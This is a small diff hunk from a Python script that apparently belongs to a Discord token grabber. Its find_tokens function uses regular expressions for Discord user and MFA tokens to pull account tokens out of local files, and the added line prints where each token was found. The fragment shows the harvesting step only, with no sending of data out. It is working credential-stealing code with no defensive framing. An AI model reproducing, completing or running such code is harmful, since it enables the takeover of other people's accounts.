@@ -22,6 +22,7 @@ def find_tokens(path):
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                 for token in re.findall(regex, line):
                     tokens.append(token)
+                    print(f'Token founded in : {path}/{file_name}')
     return tokens
 
 def main():
